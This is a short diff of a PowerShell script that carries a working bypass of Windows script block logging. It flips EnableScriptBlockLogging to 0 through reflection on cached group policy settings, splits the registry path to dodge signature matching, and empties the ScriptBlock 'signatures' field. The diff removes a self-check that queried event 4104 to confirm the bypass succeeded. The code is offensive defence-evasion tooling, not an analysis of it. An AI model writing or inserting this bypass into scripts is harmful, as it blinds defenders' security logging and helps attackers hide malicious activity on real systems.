@@ -16,22 +16,6 @@ try
         $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScriptBlockLogging',"0")
         [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
 
-        write-host " "
-        write-host "Test ScriptBlockLogging"
-
-        $log = Get-WinEvent -filterhashtable @{logname="Microsoft-Windows-PowerShell/Operational";id=4104} -erroraction 'silentlycontinue' | Where {$_.Message -like "*Test ScriptBlockLogging*"}
-        if($log -eq $null)
-        {							
-	        Write-host " "
-	        Write-host "Script block logging bypass executed successfully"
-        }
-        else
-        {							
-	        Write-host " "
-	        Write-host "Error executing Script block logging bypass. Exit "
-            return
-        }
-
 }
 catch 
 {
